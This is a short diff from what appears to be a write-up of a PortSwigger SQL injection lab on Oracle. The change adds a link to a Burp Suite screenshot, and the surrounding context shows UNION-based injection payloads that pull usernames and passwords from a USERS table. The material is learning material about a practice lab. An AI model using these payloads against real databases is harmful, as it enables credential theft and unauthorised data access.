@@ -74,7 +74,7 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,N
 SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT USERNAME_FNFYAI,PASSWORD_XDTKQN FROM USERS_MVMNFH--
 ```
 
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/f83bf1793e6c7923acd96448eaf27e0eef2aebc0/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/Retrieve%20Users%20on%20BurpSuite.png)
 
 ![image]()
 
